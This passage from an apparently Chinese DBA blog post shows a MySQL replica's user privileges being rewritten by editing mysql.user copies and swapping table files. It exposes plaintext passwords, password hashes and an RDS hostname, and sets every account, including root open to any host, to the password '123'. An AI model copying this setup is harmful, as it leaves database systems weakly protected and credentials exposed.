Jan  4 10:36 user.frm</span><br><span class="line">-rw-r-----. 1 mysql mysql   328 Jan  4 10:37 user.MYD</span><br><span class="line">-rw-r-----. 1 mysql mysql  2048 Jan  4 10:37 user.MYI</span><br><span class="line">-rw-rw----. 1 mysql mysql  3989 Aug 14 09:14 user_view.frm</span><br><span class="line">[root@sh_02 mysql]# /etc/init.d/mysqld start</span><br><span class="line">Starting MySQL.                                            [  OK  ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[root@sh_02 mysql]# mysql -uroot -p'(Uploo00king)'</span><br><span class="line">Welcome to the MariaDB monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 6</span><br><span class="line">Server version: 5.7.20-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2017, Oracle, MariaDB Corporation Ab and others.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [(none)]&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| db1                |</span><br><span class="line">| mysql              |</span><br><span class="line">| performance_schema |</span><br><span class="line">| sys                |</span><br><span class="line">+--------------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">root@MySQL-01 10:39:  [mysql]&gt; select user,host from mysql.user;</span><br><span class="line">+------+-----------+</span><br><span class="line">| user | host      |</span><br><span class="line">+------+-----------+</span><br><span class="line">| root | 127.0.0.1 |</span><br><span class="line">| root | ::1       |</span><br><span class="line">| root | localhost |</span><br><span class="line">+------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 10:39:  [mysql]&gt; grant all on *.* to booboo@'%' identified by '(Uploo00king)';</span><br><span class="line">ERROR 1785 (HY000): Statement violates GTID consistency: Updates to non-transactional tables can only be done in either autocommitted statements or single-statement transactions, and never in the same statement as updates to transactional tables.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 11:39:  [mysql]&gt; update mysql.user_1 set user='aliyun_root' where host='127.0.0.1';</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line">Rows matched: 1  Changed: 1  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 11:40:  [mysql]&gt; select user,host from mysql.user_1;</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| user        | host      |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| aliyun_root | 127.0.0.1 |</span><br><span class="line">| root        | ::1       |</span><br><span class="line">| root        | localhost |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">aliyun_root@MySQL-01 11:51:  [mysql]&gt; insert into mysql.user values ('%','jowing', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('Joowing@2017'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">aliyun_root@MySQL-01 11:51:  [mysql]&gt; select user,host from  mysql.user;</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| user        | host      |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">| jowing      | %         |</span><br><span class="line">| aliyun_root | 127.0.0.1 |</span><br><span class="line">| root        | ::1       |</span><br><span class="line">| root        | localhost |</span><br><span class="line">+-------------+-----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="生产环境"><a href="#生产环境" class="headerlink" title="生产环境"></a>生产环境</h3><h4 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h4><p>目标：IDC机房从库支持通过insert、update、delete命令来修改用户权限，权限比较简单，分为只读和写。</p>
<p>需要设置以下权限：权限作用于所有的库多有的表</p>
<table>
<thead>
<tr>
<th align="left">用户名</th>
<th align="left">密码</th>
<th align="left">权限</th>
</tr>
</thead>
<tbody><tr>
<td align="left">root</td>
<td align="left">123</td>
<td align="left">读写</td>
</tr>
<tr>
<td align="left">joowingbuz</td>
<td align="left">123</td>
<td align="left">只读</td>
</tr>
<tr>
<td align="left">ottersync</td>
<td align="left">123</td>
<td align="left">只读</td>
</tr>
<tr>
<td align="left">syncdw</td>
<td align="left">123</td>
<td align="left">只读</td>
</tr>
<tr>
<td align="left">datasis</td>
<td align="left">123</td>
<td align="left">只读</td>
</tr>
<tr>
<td align="left">joowingv</td>
<td align="left">123</td>
<td align="left">只读</td>
</tr>
<tr>
<td align="left">datadev</td>
<td align="left">123</td>
<td align="left">只读</td>
</tr>
<tr>
<td align="left">readonly</td>
<td align="left">123</td>
<td align="left">只读</td>
</tr>
</tbody></table>
<h4 id="步骤概览-1"><a href="#步骤概览-1" class="headerlink" title="步骤概览"></a>步骤概览</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 1. 登陆数据库后操作如下：</span></span><br><span class="line">use mysql;</span><br><span class="line">create table user_1 like user;</span><br><span class="line">insert into user_1 select * from user;</span><br><span class="line">delete from mysql.user_1 where user='root';</span><br><span class="line">insert into mysql.user_1 values ('%','root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','joowingbuz', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','ottersync', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','syncdw', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','datasis', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','joowingv', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','datadev', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">insert into mysql.user_1 values ('%','readonly', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line"><span class="meta">#</span><span class="bash"> 2. 退出数据库并停止服务</span></span><br><span class="line">/data/mysql/support-files/mysql.server stop</span><br><span class="line"><span class="meta">#</span><span class="bash"> 3. 将user_1表的物理文件覆盖user表</span></span><br><span class="line">cd /data/xtrabackup_data/mysql/</span><br><span class="line">mv user.frm user.ibd user.MYD user.MYI user.TRG /tmp</span><br><span class="line">mv user_1.frm user.frm</span><br><span class="line">mv user_1.MYI user.MYI</span><br><span class="line">mv user_1.MYD user.MYD</span><br><span class="line"><span class="meta">#</span><span class="bash"> 4. 启动数据库</span></span><br><span class="line">/data/mysql/support-files/mysql.server start</span><br></pre></td></tr></table></figure>

<h4 id="操作明细"><a href="#操作明细" class="headerlink" title="操作明细"></a>操作明细</h4><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@MySQL-01 15:42:  [(none)]&gt; use mysql</span><br><span class="line">Database changed</span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; create table user_1 like user;</span><br><span class="line">Query OK, 0 rows affected (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; insert into user_1 select * from user;</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line">Records: 3  Duplicates: 0  Warnings: 0</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; select user,host,authentication_string from mysql.user;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; select user,host,authentication_string from mysql.user_1;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:42:  [mysql]&gt; desc mysql.user_1;</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">| Field                  | Type                              | Null | Key | Default | Extra |</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">| Host                   | char(60)                          | NO   | PRI |         |       |</span><br><span class="line">| User                   | char(16)                          | NO   | PRI |         |       |</span><br><span class="line">| Password               | char(41)                          | NO   |     |         |       |</span><br><span class="line">| Select_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Insert_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Update_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Delete_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Drop_priv              | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Reload_priv            | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Shutdown_priv          | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Process_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| File_priv              | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Grant_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| References_priv        | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Index_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Alter_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Show_db_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Super_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_tmp_table_priv  | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Lock_tables_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Execute_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Repl_slave_priv        | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Repl_client_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_view_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Show_view_priv         | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_routine_priv    | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Alter_routine_priv     | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_user_priv       | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Event_priv             | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Trigger_priv           | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| Create_tablespace_priv | enum('N','Y')                     | NO   |     | N       |       |</span><br><span class="line">| ssl_type               | enum('','ANY','X509','SPECIFIED') | NO   |     |         |       |</span><br><span class="line">| ssl_cipher             | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| x509_issuer            | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| x509_subject           | blob                              | NO   |     | NULL    |       |</span><br><span class="line">| max_questions          | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_updates            | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_connections        | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| max_user_connections   | int(11) unsigned                  | NO   |     | 0       |       |</span><br><span class="line">| plugin                 | char(64)                          | YES  |     |         |       |</span><br><span class="line">| authentication_string  | text                              | YES  |     | NULL    |       |</span><br><span class="line">+------------------------+-----------------------------------+------+-----+---------+-------+</span><br><span class="line">42 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:47:  [mysql]&gt; delete from mysql.user_1 where user='root';</span><br><span class="line">Query OK, 3 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:51:  [mysql]&gt; insert into mysql.user_1 values ('%','root', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','joowingbuz', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','ottersync', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','syncdw', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','datasis', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','joowingv', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.01 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','datadev', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; insert into mysql.user_1 values ('%','readonly', '', 'Y', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', 'N', '', '', '', '', 0, 0, 0, 0, '', password('123'));</span><br><span class="line">Query OK, 1 row affected, 1 warning (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; select user,host,authentication_string from mysql.user;</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| user | host      | authentication_string                     |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">| root | localhost | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | 127.0.0.1 | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">| root | ::1       | *D4DF57DFB7019B3D8C4294CC413AF1D650A275E4 |</span><br><span class="line">+------+-----------+-------------------------------------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:52:  [mysql]&gt; select user,host,authentication_string from mysql.user_1;</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">| user       | host | authentication_string                     |</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">| ottersync  | %    | *9443FA914A2D69FE8832F8294E7422CC1B02A492 |</span><br><span class="line">| joowingbuz | %    | *DFFDA1CA6135E355EF468AB13A465BB5D4FE2B11 |</span><br><span class="line">| root       | %    | *89BE852E4EECFD217F0C5463FB30AD25BD0751E0 |</span><br><span class="line">| syncdw     | %    | *3DD7B4B4F6EE968FF3452B607BDEE6294B6A425A |</span><br><span class="line">| datasis    | %    | *011D511C71990F832C531A0F9CFB34CF7BB4E485 |</span><br><span class="line">| joowingv   | %    | *56B364074270DF7F6D670A6B4F5A4AD13322397A |</span><br><span class="line">| datadev    | %    | *D3D73E0F6BFC3159B024EF31484B6F9CC2963C5B |</span><br><span class="line">| readonly   | %    | *E2BA196C0C7F409990FDB3FAB5F9C7CE95F7C449 |</span><br><span class="line">+------------+------+-------------------------------------------+</span><br><span class="line">8 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@joowing-server-06:~# /data/mysql/support-files/mysql.server stop</span><br><span class="line">Shutting down MySQL</span><br><span class="line">...... * </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">root@joowing-server-06:~# cd /data/xtrabackup_data/</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data# cd mysql</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月  14 15:42 user_1.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8月  14 15:52 user_1.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8月  14 15:53 user_1.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月   9 20:14 user.frm</span><br><span class="line">-rw-r----- 1 mysql mysql 98304 8月   9 20:14 user.ibd</span><br><span class="line">-rw-r--r-- 1 mysql mysql   328 8月   9 20:14 user.MYD</span><br><span class="line">-rw-r--r-- 1 mysql mysql  2048 8月   9 20:14 user.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3569 8月   9 20:14 user.TRG</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8月   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user.frm user.ibd user.MYD user.MYI user.TRG /data</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月  14 15:42 user_1.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8月  14 15:52 user_1.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8月  14 15:53 user_1.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8月   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.frm user.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYI user.MYI</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mv user_1.MYD user.MYD</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# ll user*</span><br><span class="line">-rw-r----- 1 mysql mysql 10630 8月  14 15:42 user.frm</span><br><span class="line">-rw-r----- 1 mysql mysql   744 8月  14 15:52 user.MYD</span><br><span class="line">-rw-r----- 1 mysql mysql  2048 8月  14 15:53 user.MYI</span><br><span class="line">-rw-r----- 1 mysql mysql  3982 8月   9 20:14 user_view.frm</span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# /data/mysql/support-files/mysql.server start</span><br><span class="line">Starting MySQL</span><br><span class="line">...... * </span><br><span class="line"></span><br><span class="line">root@joowing-server-06:/data/xtrabackup_data/mysql# mysql -uroot -p'123'</span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection id is 5</span><br><span class="line">Server version: 5.7.20-log MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.</span><br><span class="line"></span><br><span class="line">root@MySQL-01 15:55:  [(none)]&gt; show slave status\G;</span><br><span class="line">*************************** 1. row ***************************</span><br><span class="line">               Slave_IO_State: Waiting for master to send event</span><br><span class="line">                  Master_Host: rm-uf6f05k2rg95s23bp.mysql.rds.aliyuncs.com</span><br><span class="line">                  Master_User: idc_slave</span><br><span class="line">                  Master_Port: 3306</span><br><span class="line">                Connect_Retry: 60</span><br><span class="line">              Master_Log_File: mysql-bin.001641</span><br><span class="line">          Read_Master_Log_Pos: 447207506</span><br><span class="line">               Relay_Log_File: joowing-server-06-relay-bin.000225</span><br><span class="line">                Relay_Log_Pos: 35529076</span><br><span class="line">        Relay_Master_Log_File: mysql-bin.001641</span><br><span class="line">             Slave_IO_Running: Yes</span><br><span class="line">            Slave_SQL_Running: Yes</span><br><span class="line">              Replicate_Do_DB: </span><br><span class="line">          Replicate_Ignore_DB: </span><br><span class="line">           Replicate_Do_Table: </span><br><span class="line">       Replicate_Ignore_Table: </span><br><span class="line">      Replicate_Wild_Do_Table: </span><br><span class="line">  Replicate_Wild_Ignore_Table: mysql.%,sys.%,information_schema.%</span><br><span class="line">                   Last_Errno: 0</span><br><span class="line">                   Last_Error: </span><br><span class="line">                 Skip_Counter: 0</span><br><span class="line">          Exec_Master_Log_Pos: 447207506</span><br><span class="line">              Relay_Log_Space: 35529295</span><br><span class="line">              Until_Condition: None</span><br><span class="line">               Until_Log_File: </span><br><span class="line">                Until_Log_Pos: 0</span><br><span class="line">           Master_SSL_Allowed: No</span><br><span class="line">           Master_SSL_CA_File: </span><br><span class="line">           Master_SSL_CA_Path: </span><br><span class="line">              Master_SSL_Cert: </span><br><span class="line">            Master_SSL_Cipher: </span><br><span class="line">               Master_SSL_Key: </span><br><span class="line">        Seconds_Behind_Master: 0</span><br><span class="line">Master_SSL_Verify_Server_Cert: No</span><br><span class="line">                Last_IO_Errno: 0</span><br><span class="line">                Last_IO_Error: </span><br><span class="line">               Last_SQL_Errno: 0</span><br><span class="line">               Last_SQL_Error: </span><br><span class="line">  Replicate_Ignore_Server_Ids: </span><br><span class="line">             Master_Server_Id: 1095052097</span><br><span class="line">                  Master_UUID: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc</span><br><span class="line">             Master_Info_File: mysql.slave_master_info</span><br><span class="line">                    SQL_Delay: 0</span><br><span class="line">          SQL_Remaining_Delay: NULL</span><br><span class="line">      Slave_SQL_Running_State: Slave has read all relay log; waiting for more updates</span><br><span class="line">           Master_Retry_Count: 86400</span><br><span class="line">                  Master_Bind: </span><br><span class="line">      Last_IO_Error_Timestamp: </span><br><span class="line">     Last_SQL_Error_Timestamp: </span><br><span class="line">               Master_SSL_Crl: </span><br><span class="line">           Master_SSL_Crlpath: </span><br><span class="line">           Retrieved_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:97478646-97483368</span><br><span class="line">            Executed_Gtid_Set: b3e1de69-5daa-11e8-bed2-7cd30ab8a9fc:1-97483368,</span><br><span class="line">c39ecf19-5daa-11e8-aa9c-7cd30ac4764a:1-178658794,</span><br><span class="line">c69289d7-9bc9-11e8-b922-44a842431b62:1-12</span><br><span class="line">                Auto_Position: 1</span><br><span class="line">         Replicate_Rewrite_DB: </span><br><span class="line">                 Channel_Name: </span><br><span class="line">           Master_TLS_Version: </span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">ERROR: </span><br><span class="line">No query specified</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 验证只读账号</span></span><br><span class="line">mysql -uroot	-p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -ujoowingbuz -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -uottersync -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -usyncdw -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -udatasis -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -ujoowingv -p'123'  -e "create database dbzyadmin;"</span><br><span class="line">mysql -udatadev -p'123' -e "create database dbzyadmin;"</span><br><span class="line">mysql -ureadonly -p'123'  -e "create database dbzyadmin;"</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 只读账号无法执行写操作，验证成功</span></span><br><span class="line">mysql: [Warning] Using a password on the command line interface can be insecure.</span><br><span class="line">ERROR 1044 (42000) at line 1: Access denied for user 'readonly'@'%' to database 'dbzyadmin'</span><br></pre></td></tr></table></figure>

<h4 id="后续用户权限变更操作指南"><a href="#后续用户权限变更操作指南" class="headerlink" title="后续用户权限变更操作指南"></a>后续用户权限变更操作指南</h4><blockquote>
<p>后续新增用户、删除用户、更改密码命令如下：</p>
</blockquote>
<h5 id="新增读写用户"><a href="#新增读写用户" class="headerlink" title="新增读写用户"></a>新增读写用户</h5><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">insert into mysql.user_1 values ('%','【用户名】', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '', '', '', '', 0, 0, 0, 0, '', password('【密码】'));</span><br></pre></td></tr></table></figure>

